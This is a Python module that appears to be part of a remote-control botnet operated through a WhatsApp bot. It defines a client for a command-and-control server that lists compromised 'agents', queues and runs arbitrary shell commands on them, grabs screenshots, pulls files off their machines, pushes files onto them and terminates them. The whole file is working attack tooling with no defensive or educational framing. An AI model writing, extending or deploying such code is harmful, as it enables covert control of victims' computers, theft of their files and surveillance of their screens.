"""
═══════════════════════════════════════════════════════════════════════════
API BRIDGE - Bot to Server Communication
REST API interface for WhatsApp C2 Bot
═══════════════════════════════════════════════════════════════════════════
"""

import requests
import json
import threading
from typing import Dict, Optional, List
from datetime import datetime
import sys
import os

sys.path.insert(0, os.path.dirname(__file__))
from master_umbrella_setup import config_get

class APIBridge:
    """Communicate with C2 Server via REST API"""
    
    def __init__(self):
        """Initialize API bridge"""
        self.server_ip = config_get('server.listen_ip', '127.0.0.1')
        self.api_port = config_get('server.api_port', 5000)
        self.base_url = f'http://{self.server_ip}:{self.api_port}/api'
        self.timeout = 10
        self.session_timeout = 30
        self.active_sessions = {}  # Cache for quick lookup
    
    def health_check(self) -> bool:
        """Check if server is alive"""
        try:
            response = requests.get(
                f'{self.base_url}/health',
                timeout=self.timeout
            )
            return response.status_code == 200
        except:
            return False
    
    def list_agents(self, filters: Dict = None) -> List[Dict]:
        """Get list of online agents"""
        try:
            params = filters or {}
            response = requests.get(
                f'{self.base_url}/agents',
                params=params,
                timeout=self.timeout
            )
            return response.json().get('agents', [])
        except Exception as e:
            return []
    
    def get_agent_info(self, agent_id: str) -> Optional[Dict]:
        """Get detailed agent information"""
        try:
            response = requests.get(
                f'{self.base_url}/agents/{agent_id}',
                timeout=self.timeout
            )
            return response.json()
        except:
            return None
    
    def execute_command(self, agent_id: str, command: str, 
                       timeout: int = 30) -> Dict:
        """Execute command on agent"""
        try:
            payload = {
                'agent_id': agent_id,
                'command': command,
                'timeout': timeout
            }
            
            response = requests.post(
                f'{self.base_url}/command/execute',
                json=payload,
                timeout=self.timeout + timeout
            )
            
            return response.json()
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def get_screenshot(self, agent_id: str) -> Optional[bytes]:
        """Get screenshot from agent"""
        try:
            response = requests.get(
                f'{self.base_url}/agents/{agent_id}/screenshot',
                timeout=self.timeout
            )
            if response.status_code == 200:
                return response.content
            return None
        except:
            return None
    
    def get_file(self, agent_id: str, filepath: str) -> Optional[bytes]:
        """Download file from agent"""
        try:
            params = {'path': filepath}
            response = requests.get(
                f'{self.base_url}/agents/{agent_id}/file',
                params=params,
                timeout=self.timeout
            )
            if response.status_code == 200:
                return response.content
            return None
        except:
            return None
    
    def upload_file(self, agent_id: str, filepath: str, 
                   content: bytes) -> Dict:
        """Upload file to agent"""
        try:
            files = {'file': content}
            data = {'path': filepath}
            
            response = requests.post(
                f'{self.base_url}/agents/{agent_id}/upload',
                files=files,
                data=data,
                timeout=self.timeout
            )
            
            return response.json()
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def get_command_history(self, agent_id: str, limit: int = 50) -> List[Dict]:
        """Get command history for agent"""
        try:
            params = {'limit': limit}
            response = requests.get(
                f'{self.base_url}/agents/{agent_id}/history',
                params=params,
                timeout=self.timeout
            )
            return response.json().get('commands', [])
        except:
            return []
    
    def get_alerts(self, filters: Dict = None) -> List[Dict]:
        """Get server alerts"""
        try:
            params = filters or {}
            response = requests.get(
                f'{self.base_url}/alerts',
                params=params,
                timeout=self.timeout
            )
            return response.json().get('alerts', [])
        except:
            return []
    
    def kill_agent(self, agent_id: str) -> Dict:
        """Terminate agent"""
        try:
            response = requests.post(
                f'{self.base_url}/agents/{agent_id}/kill',
                timeout=self.timeout
            )
            return response.json()
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    def get_server_stats(self) -> Dict:
        """Get server statistics"""
        try:
            response = requests.get(
                f'{self.base_url}/stats',
                timeout=self.timeout
            )
            return response.json()
        except:
            return {}


class CommandQueue:
    """Queue commands from bot to agents"""
    
    def __init__(self, api_bridge: APIBridge):
        """Initialize command queue"""
        self.api = api_bridge
        self.queue = []
        self.lock = threading.RLock()
        self.processor_thread = None
        self.processing = False
    
    def add_command(self, agent_id: str, command: str) -> str:
        """Add command to queue"""
        with self.lock:
            cmd_id = f'{agent_id}_{len(self.queue)}'
            self.queue.append({
                'id': cmd_id,
                'agent_id': agent_id,
                'command': command,
                'status': 'queued',
                'timestamp': datetime.now().isoformat()
            })
            return cmd_id
    
    def get_queue(self) -> List[Dict]:
        """Get all queued commands"""
        with self.lock:
            return self.queue.copy()
    
    def process_queue(self):
        """Process command queue"""
        self.processing = True
        
        while self.processing:
            with self.lock:
                for cmd in self.queue:
                    if cmd['status'] == 'queued':
                        # Execute command
                        result = self.api.execute_command(
                            cmd['agent_id'],
                            cmd['command']
                        )
                        cmd['status'] = 'executed'
                        cmd['result'] = result
            
            threading.Event().wait(1)  # Sleep 1 second
    
    def start_processing(self):
        """Start processing queue in background"""
        if not self.processing:
            self.processor_thread = threading.Thread(
                target=self.process_queue,
                daemon=True
            )
            self.processor_thread.start()


if __name__ == '__main__':
    print("✅ Testing APIBridge")
    print("═" * 50)
    
    bridge = APIBridge()
    
    # Test health check
    if bridge.health_check():
        print("✓ Server is online")
    else:
        print("✗ Server is offline (expected in test)")
    
    print(f"✓ API URL: {bridge.base_url}")
    print(f"✓ Server: {bridge.server_ip}:{bridge.api_port}")
    
    # Test command queue
    queue = CommandQueue(bridge)
    queue.add_command('test-agent-1', 'whoami')
    queue.add_command('test-agent-2', 'ipconfig')
    
    commands = queue.get_queue()
    print(f"✓ Queue size: {len(commands)} commands")
    
    print("\n✅ APIBridge ready for integration")
